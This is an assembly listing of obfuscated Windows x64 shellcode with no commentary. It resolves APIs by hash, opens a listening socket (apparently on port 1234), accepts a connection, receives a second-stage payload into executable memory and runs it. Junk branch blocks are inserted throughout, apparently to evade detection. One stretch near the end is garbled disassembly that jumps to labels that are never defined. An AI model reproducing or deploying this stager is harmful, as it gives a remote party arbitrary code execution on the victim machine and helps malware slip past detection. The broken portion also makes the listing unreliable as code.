```asm
_start:
    cld
    and rsp, 0xfffffffffffffff0
    call L_d9
RET_d:
    push r9
    push r8
    push rdx
    push rcx
    pushfq
    push rax
    xor eax, eax
    jnz bogus_1
    jmp real_1
bogus_1:
    nop
    mov rdx, rdx
real_1:
    pop rax
    popfq
    xor rdx, rdx
    mov rdx, qword ptr gs:[rdx + 0x60]
    mov rdx, qword ptr [rdx + 0x18]
    mov rdx, qword ptr [rdx + 0x20]
    push rsi
L_24:
    mov rsi, qword ptr [rdx + 0x50]
    xor r9, r9
    movzx rcx, word ptr [rdx + 0x4a]
L_30:
    xor rax, rax
    lodsb al, byte ptr [rsi]
    cmp al, 0x61
    jl L_3a
    sub al, 0x20
L_3a:
    ror r9d, 0xd
    add r9d, eax
    loop L_30
    pushfq
    push rax
    xor eax, eax
    jnz bogus_2
    jmp real_2
bogus_2:
    nop
    mov rdx, rdx
real_2:
    pop rax
    popfq
    push rdx
    push r9
    mov rdx, qword ptr [rdx + 0x20]
    mov eax, dword ptr [rdx + 0x3c]
    add rax, rdx
    cmp word ptr [rax + 0x18], 0x20b
    jne L_ce
    mov eax, dword ptr [rax + 0x88]
    test rax, rax
    je L_ce
    add rax, rdx
    mov r8d, dword ptr [rax + 0x20]
    mov ecx, dword ptr [rax + 0x18]
    add r8, rdx
    push rax
L_75:
    jrcxz L_cd
    xor r9, r9
    dec rcx
    mov esi, dword ptr [r8 + rcx*4]
    add rsi, rdx
L_84:
    xor rax, rax
    ror r9d, 0xd
    lodsb al, byte ptr [rsi]
    add r9d, eax
    cmp al, ah
    jne L_84
    add r9, qword ptr [rsp + 8]
    cmp r9d, r10d
    jne L_75
    pop rax
    mov r8d, dword ptr [rax + 0x24]
    add r8, rdx
    mov cx, word ptr [r8 + rcx*2]
    mov r8d, dword ptr [rax + 0x1c]
    add r8, rdx
    mov eax, dword ptr [r8 + rcx*4]
    pop r8
    add rax, rdx
    pop r8
    pop rsi
    pop rcx
    pop rdx
    pop r8
    pop r9
    pop r10
    sub rsp, 0x20
    push r10
    jmp rax
L_cd:
    pop rax
L_ce:
    pop r9
    pop rdx
    mov rdx, qword ptr [rdx]
    jmp L_24
L_d9:
    pop rbp
    pushfq
    push rax
    xor eax, eax
    jnz bogus_3
    jmp real_3
bogus_3:
    nop
    mov rdx, rdx
real_3:
    pop rax
    popfq
    movabs r14, 0x32335f327377
    push r14
    mov r14, rsp
    sub rsp, 0x1a0
    mov r13, rsp
    xor rax, rax
    push rax
    push rax
    movabs r12, 0xd2040002
    push r12
    mov r12, rsp
    mov rcx, r14
    mov r10d, 0x726774c
    call rbp
    mov rdx, r13
    push 0x101
    pop rcx
    mov r10d, 0x6b8029
    call rbp
    push 2
    pop rcx
    push rax
    push rax
    xor r9, r9
    xor r8, r8
    inc rax
    mov rdx, rax
    mov r10d, 0xe0df0fea
    call rbp
    mov rdi, rax
    push 0x10
    pop r8
    mov rdx, r12
    mov rcx, rdi
    mov r10d, 0x6737dbc2
    call rbp
    xor rdx, rdx
    mov rcx, rdi
    mov r10d, 0xff38e9b7
    call rbp
    xor r8, r8
    xor rdx, rdx
    mov rcx, rdi
    mov r10d, 0xe13bec74
    call rbp
    mov rcx, rdi
    mov rdi, rax
    mov r10d, 0x614d6e75
    call rbp
    add rsp, 0x2b0
    xor r9, r9
    push 0x10
    pop r8
    call L_1a1
    mov byte ptr [rcx + 0x31], ch
    hlt
    movsd dword ptr [rdi], dword ptr [rsi]
    jo L_1e4
    xor al, 0xae
    or dword ptr [rdi + 0xd02c60b], ebp
    movabs dword ptr [0xc2c2c749f989485a], eax
    jmp L_1e3
    pop rdi
    call rbp
    sub rsp, 0x10
    mov rdx, rsp
    xor r9, r9
    push 4
    pop r8
    mov rcx, rdi
    mov r10d, 0x5fc8d902
    call rbp
    add rsp, 0x20
    pop rsi
    mov esi, esi
    push 0x40
    pop r9
    push 0x1000
    pop r8
    mov rdx, rsi
    xor rcx, rcx
    mov r10d, 0xe553a458
    call rbp
    mov rbx, rax
    mov r15, rax
    pushfq
    push rax
    xor eax, eax
    jnz bogus_4
    jmp real_4
bogus_4:
    nop
    mov rdx, rdx
real_4:
    pop rax
    popfq
L_1ed:
    xor r9, r9
    mov r8, rsi
    mov rdx, rbx
    mov rcx, rdi
    mov r10d, 0x5fc8d902
    call rbp
    add rbx, rax
    sub rsi, rax
    test rsi, rsi
    jne L_1ed
    jmp r15
    pop rax
    push 0
    pop rcx
    mov r10, 0x56a2b5f0
    call rbp
```